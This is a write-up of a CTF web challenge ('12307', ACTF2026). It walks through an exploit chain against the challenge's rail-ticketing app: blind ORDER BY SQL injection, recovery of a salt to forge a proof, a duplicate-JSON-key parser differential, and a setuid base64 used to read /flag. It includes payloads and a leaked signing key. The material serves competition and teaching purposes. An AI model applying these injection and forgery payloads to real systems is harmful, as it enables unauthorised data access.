---
title: ACTF2026 WP
url: https://mp.weixin.qq.com/s/oNq0LqLwa7ncOIwTk_TSXw
source: Doonsec's feed
date: 2026-05-22
fetch_date: 2026-05-23T05:35:05.040637
---

# ACTF2026 WP

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/L5p13fmOxK0YfnlYUl1iaKPNFELKD7jpUvZur6Hb0cx4GQs5BpwEia6NBGAuzeeYX79m8auOajzQBJell9IFicibCLzX2wxgq1zHicibrED9dlcKs/0?wx_fmt=jpeg)

# ACTF2026 WP

原创

Inf1n1ty
Inf1n1ty

Zer0day安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

# Web

## 12307

![](https://mmbiz.qpic.cn/sz_mmbiz_png/L5p13fmOxK2icPdEt3tDyVCpgRlSeskfu8JjdfS3dxGHq1Tib0LEOBTQtoFCEuedn7hgMshibPz2pSSsQuAEbVMTI3jVhofImbhhJibmibhSP4ibE/640?wx_fmt=png&from=appmsg)

img

### 题目分析

对源码进行审计：

1. 1. ORDER BY SQL 注入

```
def fare_scope_expression(scope):
    fields = {
        "ticket": "ticket_no",
        "passenger": "passenger",
        "train": "train_id",
        "station": "station_code",
        "state": "status",
    }
    if isinstance(scope, str):
        return fields.get(scope, "ticket_no")
    if not isinstance(scope, dict):
        return "ticket_no"
    if scope.get("mode") == "legacy-rank":
        return str(scope.get("expr", "ticket_no"))[:240]
def reprice_fare(self, data):
    station_code = str(data.get("stationCode", "BJP"))[:16]
    scope = fare_scope_expression(data.get("tariffScope", "ticket"))
    sql = (
        "SELECT ticket_no,station_code,status FROM ticket_index "
        "WHERE station_code IN (%s,'BJP') "
        f"ORDER BY {scope} LIMIT 1"
    )
```

scope.get("expr") 直接进入 ORDER BY，没有参数化，SQL可控。返回里 bucket 会根据第一行是不是 T-BJP- 开头而变化，可以布尔盲注。

1. 1. claimProof 盲注绕过

adjust\_ticket() 本来要求正确的 claimProof 才能写入 ticket adjustment。

```
expected_digest = claim_digest(
    artifact["order_id"],
    artifact["train_id"],
    artifact["station_code"],
    ticket_no,
    artifact["claim_salt"],
)
expected_proof = claim_proof(
    artifact["order_id"],
    artifact["train_id"],
    artifact["station_code"],
    ticket_no,
    artifact["claim_salt"],
    artifact["claim_digest"],
)
if artifact["claim_digest"] != expected_digest or submitted_proof != expected_proof:
    send_json(self, 409, {"error": "binding_review"})
    return

def claim_digest(order_id, train_id, station_code, ticket_no, claim_salt):
    parts = [
        str(order_id),
        str(train_id),
        str(station_code),
        str(ticket_no),
        str(claim_salt),
    ]
    return hashlib.sha256("|".join(parts).encode()).hexdigest()

def claim_proof(order_id, train_id, station_code, ticket_no, claim_salt, digest_value=None):
    digest_value = digest_value or claim_digest(order_id, train_id, station_code, ticket_no, claim_salt)
    return f"CP-{claim_salt}-{str(digest_value)[:12]}"

```

claim\_salt 可被盲注出来，所以能构造合法 proof。

1. 1. 重复 JSON key 解析差异

```
def first_wins_object(pairs):
    result = {}
    for key, value in pairs:
        if key not in result:
            result[key] = value
    return result
header = json.loads(b64url_decode(protected).decode())
payload_text = b64url_decode(payload).decode()
public_view = json.loads(payload_text, object_pairs_hook=first_wins_object)
render_view = json.loads(payload_text)
checks = {
    "batchId": batch_id,
    "orderId": order["order_id"],
    "stationCode": order["station_code"],
    "templateDigest": template_digest,
    "routeName": route_name,
    "ledgerRef": str((boarding_channel or {}).get("ledgerRef", "")),
    "printProfile": "counter-copy",
    "printer": "thermal-standard",
}
for key, expected_value in checks.items():
    if str(public_view.get(key, "")) != str(expected_value):
        return None, ["partner_receipt_review"]
print_plan = {
    "profile": str(render_view.get("printProfile", "counter-copy"))[:64],
    "printer": str(render_view.get("printer", "thermal-standard"))[:64],
    "prefix": str(render_view.get("prefix", "reconciliation"))[:48],
    "cell": str(render_view.get("cell", "receipt"))[:48],
    "ledgerRef": checks["ledgerRef"],
    "boardingNonce": str((boarding_channel or {}).get("boardingNonce", "")),
    "driverProgram": str(render_view.get("driverProgram", ""))[:160],
    "driverArgument": str(render_view.get("driverArgument", ""))[:160],
}
```

校验用的是第一次出现的键，真正打印的是最后一次出现的键。因此可以构造重复键：前值过校验，后值控渲染。

1. 1. 打印桥可执行 base64 /flag

```
def run_driver(program, argument):
    if not program.startswith(os.path.join("/", "usr", "bin", "")):
        return ""
    if not argument.startswith(os.path.join("/", "")):
        return ""
    pid = os.posix_spawn(program, [program, argument], os.environ, file_actions=file_actions)
```

在Dockerfile中

```
cat > /run/rail-spool/device-map.json <<'MAP'
{
  "profile-delta-closeout": {"codec":"settlement-filter","acceptedPrograms":["/usr/bin/base64"]},
  "profile-north-closeout": {"codec":"settlement-filter","acceptedPrograms":["/usr/bin/printf"]},
  "profile-baggage-preview": {"codec":"settlement-filter","acceptedPrograms":["/usr/bin/printf"]}
}
MAP

chown root:root /flag
chmod 0600 /flag
chown root:root /usr/bin/base64
chmod 4755 /usr/bin/base64
```

执行/usr/bin/base64 /flag，就能拿到 flag 的 base64 文本

### 利用过程

进入容器，直接在控制台进行尝试（1=1，1=0）

```
fetch('/api/desk/fares/reprice', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    stationCode: 'HGH',
    amount: 0,
    tariffScope: {
      mode: 'legacy-rank',
      expr: "CASE WHEN (1=1) THEN station_code='BJP' ELSE station_code='HGH' END DESC"
    }
  })
}).then(r => r.json()).then(console.log)
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/L5p13fmOxK2qq4mIJMD9gPaCXnaKoY3kTCdhkLbDplE6JkcZSbDRJYtSA1lO5KVn5SbUje1uic0PPrCEaApXpxq8X5LgcuJ5Ty4OPyoCUib2c/640?wx_fmt=png&from=appmsg)

img

发现1=1（T）的时候north-window   当1=0（F）的时候local-window

所以我们可以进行布尔盲注

```
CASE WHEN (SUBSTRING((SELECT claim_salt ...),pos,1)='X')
THEN station_code='BJP' ELSE station_code='HGH' END DESC
```

claim\_salt 为：RW9GHNMZ8

再按 rail\_common.py 的算法计算：

* • raw = orderId|trainId|stationCode|ticketNo|claimSalt
* • digest = sha256(raw)
* • claimProof = CP--<digest[:12]>

得到claimProof = CP-RW9GHNMZ8-7de9adf4f900

![](https://mmbiz.qpic.cn/mmbiz_png/L5p13fmOxK0FPfeJqy64icbAtVdib9vTxJDs0EssdBiaYItF4VicQcLdjuIkJia9tSlX9ZKAfuaDxlHTTx44peDrs8O00bIlDQzIJX7UmriaiaCIkg/640?wx_fmt=png&from=appmsg)

img

进入站务规则编译，打开 batchOpen，提交的结构化 memo 要符合这组值。随后调用 station-desk-ledger，即可把：

* • waitlist\_entries.sampled = 1
* • station\_profiles.batch\_open = 1
* • rendererProfile = folio-grid-27
* • signerRoute = delta-window-27

全都打开

![](https://mmbiz.qpic.cn/sz_mmbiz_png/L5p13fmOxK3NeYmLQODnVzoQxpPbkGgcgSyRMQtJpicoz5SpRIg5G6ibeMxibdjLJrRzdQdpz4tDQglQ6IVKQ8znsPJOo7richRZgPpl4HVbUE8/640?wx_fmt=png&from=appmsg)

img

从图中可以看到：

* • tickets/adjust -> 202
* • imports/health station-desk-ledger -> accepted
* • metadata 中已经出现：

+ • batchOpen: true
+ • rendererProfile: folio-grid-27
+ • signerRoute: delta-window-27

1. 1. 编译 notice feed，打开 board profile 与 partner jwks

带 header 片段的 notice，调用 station-partner-feed对 HGH

```
X-Desk-Lane: delta-window-27
X-Board-Window: seat-window-e27
X-Desk-Key-Id: POL-HGH-TRUSTED
X-Desk-Key: delta-window-27
```

成功后会在 Redis 里写入：

* • rail:interline:lane:HGH
* • rail:board:profile:HGH
* • rail:partner:jwks:HGH

1. 1. 创建 batch，并通过 WebSocket 拿到 ledgerRef

创建一个 defer=true 的 batch，拿到：

* • batchId
* • templateDigest

然后利用 waitlist\_push/server.js的 boarding 流：

* • boarding.hello\_required
* • boarding.hello
* • boarding.bind
* • boarding.confirm

成功后返回：edgerRef = 19d34e0426757ea5f9de37ad

1. 1. 伪造 carrierSeal，完整链

构造一个重复 key的 carrierSeal payload，使得：

* • 校验阶段看到 printProfile = counter-copy printer = thermal-standard
* • 渲染阶段看到 printProfile = clearing-batch printer = line-printer driverProgram = /usr/bin/base64 driverArgument = /flag

签名使用 HS256，key 直接来自题目附件里的 trusted policy：

* • POL-HGH-TRUSTED
* • e94c0a8d-12307-hgh-trusted

之后顺序执行：

* • /api/corporate/receipts/prepare
* • /api/mobile/waitlist/pulse
* • /api/corporate/settlement/schedule
* • 轮询 /api/corporate/reconciliation/

最终 report.body 中会出现 /flag 的 base64。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/L5p13fmOxK0dEu1S9UddoDIGGiaiaCV5BLUVQkWUZN37MUEp7PMbLYaVa8TicnlRad8phArOxTKGrrn3lVTJojZy2RkyooQF9zE3PnLoFtoL30/640?wx_fmt=png&from=appmsg)

img

![](https://mmbiz.qpic.cn/mmbiz_png/...